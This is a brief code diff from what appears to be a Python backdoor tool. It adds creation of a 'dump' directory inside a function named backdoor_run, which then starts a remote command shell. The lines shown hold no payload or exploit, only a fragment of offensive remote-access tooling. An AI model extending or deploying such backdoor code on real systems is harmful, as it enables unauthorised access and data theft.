@@ -1,7 +1,7 @@
 from sys import stderr, exit, stderr
-from os import system, listdir, fork, wait
+from os import mkdir, system, listdir, fork, wait
 from socket import error as socket_error
-
+import os.path
 
 from utils.crypto import encrypt, decrypt
 
@@ -109,5 +109,7 @@ def cmd_shell(conn, shell_port, status):
 
 def backdoor_run(conn, shell_port):
     print("\n[+] Running backdoor...")
+    if not os.path.isdir("dump"):
+        mkdir("dump")
     status = 0
     cmd_shell(conn, shell_port, status)
